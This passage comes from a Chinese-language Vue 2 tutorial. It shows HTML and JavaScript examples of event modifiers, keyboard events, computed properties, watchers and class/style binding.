class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 事件的默认行为立即执行，无需等待事件回调执行完毕 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;list&quot;</span> @<span class="hljs-attr">wheel.passive</span>=<span class="hljs-string">&quot;demo&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;Vue校园&#x27;</span></span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">methods</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">showInfo</span>(<span class="hljs-params">e</span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;同学你好&#x27;</span>)</span><br><span class="language-javascript">                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e.<span class="hljs-property">target</span>)</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-title function_">showInfo2</span>(<span class="hljs-params">e</span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e.<span class="hljs-property">target</span>)</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-title function_">showMsg</span>(<span class="hljs-params">msg</span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(msg)</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-title function_">demo</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-comment">// console.log(&#x27;@&#x27;)</span></span><br><span class="language-javascript">                <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">100000</span>;i++)&#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;#&#x27;</span>)</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;累死了&#x27;</span>)</span><br><span class="language-javascript"></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="键盘事件"><a href="#键盘事件" class="headerlink" title="键盘事件"></a>键盘事件</h3><p>案例：按下回车后返回输入的值 （@keyup.enter）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>欢迎来到&#123;&#123;name&#125;&#125;学习<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;按下回车提示输入&quot;</span> @<span class="hljs-attr">keyup.enter</span>=<span class="hljs-string">&quot;showInfo&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;vue学院&#x27;</span></span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">methods</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">showInfo</span>(<span class="hljs-params">e</span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>)</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)</span><br></code></pre></td></tr></table></figure><p><strong>vue常用的按键别名：</strong></p><ul><li>回车 enter</li><li>删除和退格 delete</li><li>退出 esc</li><li>空格 space</li><li>换行 tab</li><li>上 up</li><li>下 down</li><li>左 left</li><li>右 right</li></ul><p>Vue未提供别名的按键，可以使用<strong>按键原始的key值去绑定</strong>，但注意要转成kebab-case（短横线命名）</p><ul><li>e.key ——按键名</li><li>e.keyCode——按键编码（MDN不建议使用）</li></ul><p>某些按键需要配合keydown（而不是直接keyup）使用，例如：<strong>tab、ctrl、alt、shift、meta</strong></p><p>​<strong>系统修饰键（ctrl、alt、shift、meta）的使用：</strong></p><ol><li>配合keydown使用：正常触发</li><li>配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发</li></ol><h2 id="计算属性与监视"><a href="#计算属性与监视" class="headerlink" title="计算属性与监视"></a>计算属性与监视</h2><h3 id="姓名案例（计算属性）"><a href="#姓名案例（计算属性）" class="headerlink" title="姓名案例（计算属性）"></a>姓名案例（计算属性）</h3><p>需要实现的效果：</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-11-24%20%E4%B8%8A%E5%8D%8811.36.04.png" alt="" style="zoom:50%;" /><p>使用<strong>插值语法</strong>实现：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    姓:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;firstName&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    名:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;lastName&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    全名：<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>&#123;&#123;firstName&#125;&#125;-&#123;&#123;lastName&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">firstName</span>:<span class="hljs-string">&#x27;张&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">lastName</span>:<span class="hljs-string">&#x27;三&#x27;</span></span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>使用<strong>methods</strong>实现：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    姓:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;firstName&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    名:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;lastName&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    全名：<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>&#123;&#123;fullName()&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">firstName</span>:<span class="hljs-string">&#x27;张&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">lastName</span>:<span class="hljs-string">&#x27;三&#x27;</span></span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">methods</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">fullName</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">firstName</span> + <span class="hljs-string">&#x27;-&#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">lastName</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>使用<strong>计算属性</strong>实现：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    姓:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;firstName&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    名:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;lastName&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    全名：<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">firstName</span>:<span class="hljs-string">&#x27;张&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">lastName</span>:<span class="hljs-string">&#x27;三&#x27;</span></span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">computed</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">fullName</span>:&#123;</span><br><span class="language-javascript">                <span class="hljs-comment">//什么时候调用get？</span></span><br><span class="language-javascript">                <span class="hljs-comment">// 1.初次读取fullName</span></span><br><span class="language-javascript">                <span class="hljs-comment">// 2.所依赖的数据发生改变</span></span><br><span class="language-javascript">                <span class="hljs-title function_">get</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                    <span class="hljs-comment">// console.log(this) //这里的this指向vue</span></span><br><span class="language-javascript">                    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">firstName</span> + <span class="hljs-string">&#x27;-&#x27;</span> +<span class="hljs-variable language_">this</span>.<span class="hljs-property">lastName</span></span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-comment">//什么时候调用set？</span></span><br><span class="language-javascript">                <span class="hljs-comment">// 修改fullName时</span></span><br><span class="language-javascript">                <span class="hljs-title function_">set</span>(<span class="hljs-params">value</span>)&#123;</span><br><span class="language-javascript">                    <span class="hljs-keyword">const</span> arr= value.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;-&#x27;</span>)</span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">firstName</span> = arr[<span class="hljs-number">0</span>]</span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">lastName</span> = arr[<span class="hljs-number">1</span>]</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="计算属性"><a href="#计算属性" class="headerlink" title="计算属性"></a>计算属性</h3><p>要用的属性不存在，通过已有属性计算得来。</p><p><strong>原理</strong>：底层借助Object.defineproperty方法提供的getter和setter</p><p>get函数什么时候执行？</p><ol><li>初次读取</li><li>所依赖的数据发生改变</li></ol><p>与methods相比，内部有<strong>缓存</strong>机制（复用）。效率更高，调试方便。</p><p>若计算属性<strong>只读不改（只使用get）</strong>，可考虑<strong>简写</strong>。</p><p>例如案例改写：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">computed</span>:&#123;<br><span class="hljs-comment">//简写</span><br><span class="hljs-title function_">fullName</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">firstName</span> + <span class="hljs-string">&#x27;-&#x27;</span> +<span class="hljs-variable language_">this</span>.<span class="hljs-property">lastName</span>                <br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="天气案例（监视属性）"><a href="#天气案例（监视属性）" class="headerlink" title="天气案例（监视属性）"></a>天气案例（监视属性）</h3><p>点击按钮切换天气（炎热&#x2F;凉爽）</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-11-24%20%E4%B8%8B%E5%8D%883.40.06.png" alt="" style="zoom:50%;" /><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>今天天气很&#123;&#123;info&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;changeWeather&quot;</span>&gt;</span>切换天气<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>写法1：methods-watch</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br>   <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,<br>   <span class="hljs-attr">data</span>:&#123;<br>    <span class="hljs-attr">isHot</span>:<span class="hljs-literal">true</span><br>   &#125;,<br>   <span class="hljs-attr">computed</span>:&#123;<br>    <span class="hljs-title function_">info</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">isHot</span> ? <span class="hljs-string">&#x27;炎热&#x27;</span> : <span class="hljs-string">&#x27;凉爽&#x27;</span><br>    &#125;&#125;,<br>    <span class="hljs-attr">methods</span>: &#123;<br>        <span class="hljs-title function_">changeWeather</span>(<span class="hljs-params"></span>)&#123;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">isHot</span> = !<span class="hljs-variable language_">this</span>.<span class="hljs-property">isHot</span><br>        &#125;<br>    &#125;,<br>    <span class="hljs-attr">watch</span>:&#123;<br>        <span class="hljs-attr">isHot</span>:&#123;<br>            <span class="hljs-attr">immediate</span>:<span class="hljs-literal">true</span>, <span class="hljs-comment">//初始化时让handler调用</span><br>            <span class="hljs-comment">//何时调用hander？当isHot发生改变时</span><br>            <span class="hljs-title function_">handler</span>(<span class="hljs-params">newValue,oldValue</span>)&#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;isHot被修改了&#x27;</span>,newValue,oldValue)<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>写法2：vm.$watch</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js">vm.$watch(<span class="hljs-string">&#x27;isHot&#x27;</span>,&#123;<br>    <span class="hljs-attr">immediate</span>:<span class="hljs-literal">true</span>, <span class="hljs-comment">//初始化时让handler调用</span><br>     <span class="hljs-comment">//何时调用hander？当isHot发生改变时</span><br>     <span class="hljs-title function_">handler</span>(<span class="hljs-params">newValue,oldValue</span>)&#123;<br>     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;isHot被修改了&#x27;</span>,newValue,oldValue)<br>     &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><h3 id="监视属性-watch"><a href="#监视属性-watch" class="headerlink" title="监视属性-watch"></a>监视属性-watch</h3><ol><li>当被监视的属性发生变化时，回调函数自动调用，进行相关操作</li><li>监视的属性必须存在，才能进行监视</li><li>监视的<strong>两种写法</strong><ol><li>new Vue时传入watch配置</li><li>通过vm.$watch监视</li></ol></li></ol><p><strong>深度检测</strong>：**<code>deep:true</code>**</p><ul><li>Vue中的watch默认不检测对象内部值的改变（一层）</li><li>配置deep:true可以检测对象内部值的改变（多层）</li></ul><p>Vue自身可以检测对象内部值的改变，但watch默认不可以。</p><p>使用watch时根据数据的具体结构，决定是否采用深度监视。</p><p><strong>检测简写</strong>：</p><p>无需immediate、deep时</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">watch</span>:&#123;<br>    <span class="hljs-comment">// 正常写法</span><br>    <span class="hljs-attr">isHot</span>:&#123;<br>        <span class="hljs-attr">immediate</span>:<span class="hljs-literal">true</span>, <span class="hljs-comment">//初始化时让handler调用</span><br>        <span class="hljs-attr">deep</span>:<span class="hljs-literal">true</span>, <span class="hljs-comment">//深度监视</span><br>        <span class="hljs-title function_">handler</span>(<span class="hljs-params">newValue,oldValue</span>)&#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;isHot被修改了&#x27;</span>,newValue,oldValue)<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 简写</span><br>    <span class="hljs-title function_">isHot</span>(<span class="hljs-params">newValue,oldValue</span>)&#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;isHot被修改了&#x27;</span>,newValue,oldValue)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//正常写法</span><br>vm.$watch(<span class="hljs-string">&#x27;isHot&#x27;</span>,&#123;<br>  <span class="hljs-attr">immediate</span>:<span class="hljs-literal">true</span>, <span class="hljs-comment">//初始化时让handler调用</span><br>  <span class="hljs-comment">//何时调用hander？当isHot发生改变时</span><br>  <span class="hljs-title function_">handler</span>(<span class="hljs-params">newValue,oldValue</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;isHot被修改了&#x27;</span>,newValue,oldValue)<br>  &#125;<br>&#125;)<br><span class="hljs-comment">//简写</span><br>vm.$watch(<span class="hljs-string">&#x27;isHot&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">newValue,oldValue</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;isHot被修改了&#x27;</span>,newValue,oldValue)<br>&#125;)<br></code></pre></td></tr></table></figure><h3 id="computed-vs-watch"><a href="#computed-vs-watch" class="headerlink" title="computed vs watch"></a>computed vs watch</h3><p>当两者都能实现要求时，使用计算属性更便捷。</p><p>computed能实现的功能，watch都能实现。</p><p>但watch能完成的功能，computed不一定能完成。（例如watch可以进行异步操作）。</p><p>注意：</p><ul><li><strong>被Vue所管理的函数</strong>，最好写成<strong>普通函数</strong>，这样this指向的才是vm或组件实例对象</li><li>所有<strong>不被Vue所管理的函数</strong>（定时器的回调函数、ajax的回调函数、Promise的回调函数等），最好写成<strong>箭头函数</strong>，这样this的指向才是vm或组件实例对象</li></ul><h2 id="class与style绑定"><a href="#class与style绑定" class="headerlink" title="class与style绑定"></a>class与style绑定</h2><p>在应用界面中, 某个(些)元素的样式是变化的。</p><p>class&#x2F;style 绑定就是专门用来实现动态样式效果的技术。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 绑定class样式 --字符串写法，适用于：样式的类名不确定，需要动态指定 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;basic&quot;</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">&quot;mood&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;changeMood&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- 绑定class样式 --数组写法，适用于：要绑定的样式个数不确定，名字不确定 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;basic&quot;</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">&quot;classArr&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- 绑定class样式 --对象写法，适用于：要绑定的样式个数确定，名字也确定，但要动态决定用不用 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;basic&quot;</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">&quot;classObj&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- 绑定style样式 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> 